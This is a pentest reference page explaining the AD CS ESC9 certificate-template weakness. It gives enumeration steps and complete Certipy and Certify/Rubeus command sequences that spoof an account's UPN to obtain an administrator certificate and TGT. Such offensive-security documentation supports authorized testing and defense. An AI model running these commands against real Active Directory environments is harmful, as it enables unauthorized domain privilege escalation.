# ESC9

{% hint style="info" %}
No Security Extension (Enrolee can modify own UPN to request cert on behalf of ANY user)
{% endhint %}

## Why It Works

* Certificates issued by a modern CA normally embed a strong SID-binding extension (`szOID_NTDS_CA_SECURITY_EXT`) that ties the cert directly to the account's SID - this is what prevents UPN-spoofing style attacks in the first place.
* A template with `CT_FLAG_NO_SECURITY_EXTENSION` set on `msPKI-Enrollment-Flag` **omits** that strong binding from issued certificates.
* This only becomes exploitable when the domain controller's `StrongCertificateBindingEnforcement` registry value (`HKLM\SYSTEM\CurrentControlSet\Services\Kdc`) is **not** set to full enforcement (`2`) - i.e. it's `0`/disabled or `1`/compatibility mode - meaning the KDC falls back to weaker UPN-based mapping when the strong extension is absent.
* Attack flow: the attacker (with `GenericWrite` over their own or a victim account) temporarily sets that account's `userPrincipalName` to match a **target privileged account's** identity value, enrolls for the certificate (embedding the spoofed UPN, but no SID due to the missing extension), then reverts the UPN back to avoid breaking normal logon.
* Authenticating with that certificate causes the KDC to resolve identity via the (no-longer-current, but cert-embedded) UPN value - mapping the session to the **privileged target account** instead of the attacker's own.

## Prerequisites

* Template has `CT_FLAG_NO_SECURITY_EXTENSION` set.
* `StrongCertificateBindingEnforcement` on the DC(s) is not set to `2` (full enforcement).
* `GenericWrite`/`Validated-SPN`-equivalent write access over the `userPrincipalName` of the account used to enroll.

## Enumerate

```bash
certipy find -u <user>@<domain> -p <password> -dc-ip <DC-IP> -vulnerable -stdout
## Flags templates with 'No Security Extension' and notes current StrongCertificateBindingEnforcement registry value
```

## Exploit

{% tabs %}
{% tab title="Certipy" %}
```bash
## 1. Set your controlled account's UPN to the target's identity
certipy account update -u <user>@<domain> -p <password> -dc-ip <DC-IP> -user <controlled-account> -upn administrator

## 2. Enroll for the vulnerable (no-security-extension) template as the controlled account
certipy req -u <controlled-account>@<domain> -p <password> -ca <CA-Name> -template <vulnerable-template>

## 3. Revert the UPN so normal logon for the controlled account still works
certipy account update -u <user>@<domain> -p <password> -dc-ip <DC-IP> -user <controlled-account> -upn <controlled-account>@<domain>

## 4. Authenticate as the target using the issued certificate
certipy auth -pfx administrator.pfx -dc-ip <DC-IP>
```
{% endtab %}

{% tab title="PowerShell/RSAT + Certify + Rubeus" %}
```powershell
## 1. Set your controlled account's UPN to the target's identity (RSAT AD module or PowerView)
Set-ADUser -Identity <controlled-account> -UserPrincipalName administrator

## 2. Enroll for the vulnerable template as the controlled account
Certify.exe request /ca:<CA-ServerDomain>\<CA-Username> /template:<vulnerable-template>

## 3. Revert the UPN
Set-ADUser -Identity <controlled-account> -UserPrincipalName <controlled-account>@<domain>

## 4. Convert cert and request TGT as the target
openssl.exe pkcs12 -in esc9.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out esc9.pfx
Rubeus.exe asktgt /user:administrator /certificate:esc9.pfx /ptt
```
{% endtab %}
{% endtabs %}
